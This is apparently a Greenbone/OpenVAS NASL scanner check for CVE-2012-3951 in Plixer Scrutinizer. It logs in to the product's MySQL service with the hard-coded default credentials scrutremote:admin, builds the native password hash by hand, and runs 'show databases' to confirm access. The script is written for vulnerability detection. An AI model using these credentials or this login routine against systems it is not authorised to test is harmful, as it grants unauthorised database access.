CPE = "cpe:/a:dell:sonicwall_scrutinizer";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103533" );
	script_bugtraq_id( 54731 );
	script_cve_id( "CVE-2012-3951" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-09-07T06:04:54+0000" );
	script_name( "Scrutinizer Default Password Security Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54731" );
	script_tag( name: "last_modification", value: "2021-09-07 06:04:54 +0000 (Tue, 07 Sep 2021)" );
	script_tag( name: "creation_date", value: "2012-08-08 12:18:06 +0200 (Wed, 08 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Databases" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "mysql_version.sc", "gb_scrutinizer_detect.sc" );
	script_require_ports( "Services/www", 80, "Services/mysql", 3306 );
	script_mandatory_keys( "scrutinizer/installed" );
	script_tag( name: "summary", value: "The MySQL component in Plixer Scrutinize is prone to a
  security-bypass vulnerability." );
	script_tag( name: "impact", value: "Successful attacks can allow an attacker to gain access to the
  affected application using the default authentication credentials scrutremote:admin." );
	script_tag( name: "affected", value: "Scrutinizer 9.5.0 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for
  more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("byte_func.inc.sc");
require("port_service_func.inc.sc");
if(!get_app_location( cpe: CPE, nofork: TRUE )){
	exit( 0 );
}
set_byte_order( BYTE_ORDER_LITTLE_ENDIAN );
port = service_get_port( default: 3306, proto: "mysql" );
if(get_kb_item( "MySQL/" + port + "/blocked" )){
	exit( 0 );
}
sock = open_sock_tcp( port );
if(!sock){
	exit( 0 );
}
res = recv( socket: sock, length: 4 );
if(!res){
	exit( 0 );
}
plen = ord( res[0] ) + ( ord( res[1] ) / 8 ) + ( ord( res[2] ) / 16 );
res = recv( socket: sock, length: plen );
for(i = 0;i < strlen( res );i++){
	if( ord( res[i] ) != 0 ){
		ver += res[i];
	}
	else {
		break;
	}
}
p = strlen( ver );
if(p < 5){
	exit( 0 );
}
salt = substr( res, 5 + p, 12 + p ) + substr( res, 32 + p, 43 + p );
username = "scrutremote";
password = "admin";
sha_pass1 = SHA1( password );
sha_pass2 = SHA1( sha_pass1 );
sha_pass3 = SHA1( salt + sha_pass2 );
l = strlen( sha_pass3 );
for(i = 0;i < l;i++){
	pass += raw_string( ord( sha_pass1[i] ) ^ ord( sha_pass3[i] ) );
}
req = raw_string( 0x05, 0xa6, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x01, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 );
req += raw_string( username, 0x00, 0x14, pass );
len = strlen( req );
req = raw_string( len & 0xff, ( len >> 8 ) & 0xff, ( len >> 16 ) & 0xff, 0x01 ) + req;
send( socket: sock, data: req );
res = recv( socket: sock, length: 4 );
if(!res || strlen( res ) < 4){
	close( sock );
	exit( 0 );
}
plen = ord( res[0] ) + ( ord( res[1] ) / 8 ) + ( ord( res[2] ) / 16 );
res = recv( socket: sock, length: plen );
if(!res || strlen( res ) < plen){
	exit( 0 );
}
errno = ord( res[2] ) << 8 | ord( res[1] );
if(errno > 0 || errno == ""){
	exit( 0 );
}
cmd = "show databases";
len = strlen( cmd ) + 1;
req = raw_string( len & 0xff, ( len >> 8 ) & 0xff, ( len >> 16 ) & 0xff, 0x00, 0x03, cmd );
send( socket: sock, data: req );
z = 0;
for(;TRUE;){
	z++;
	if(z > 15){
		exit( 0 );
	}
	res = recv( socket: sock, length: 4 );
	if(!res || strlen( res ) < 4){
		close( sock );
		exit( 0 );
	}
	plen = ord( res[0] ) + ( ord( res[1] ) / 8 ) + ( ord( res[2] ) / 16 );
	res = recv( socket: sock, length: plen );
	if(!res || strlen( res ) < plen){
		break;
	}
	if(ContainsString( res, "plixer" ) || ContainsString( res, "information_schema" )){
		close( sock );
		security_message( port: port );
		exit( 0 );
	}
}
close( sock );

